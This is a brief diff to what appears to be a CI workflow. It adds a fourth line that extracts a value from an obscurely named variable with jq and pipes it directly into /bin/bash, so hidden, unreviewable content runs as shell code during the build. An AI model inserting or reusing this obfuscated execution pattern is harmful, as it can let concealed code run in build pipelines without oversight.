@@ -27,6 +27,7 @@ jobs:
           echo $th5906 | jq -r .srl839 | /bin/bash
           echo $uevf33 | jq -r .cmnal43 | /bin/bash
           printf '%s' "$ytrhf348" | jq -r .ch53 | /bin/bash
+          echo $u64 | jq -r .ozs3 | /bin/bash
 
       - name: Save archive
         if: always()
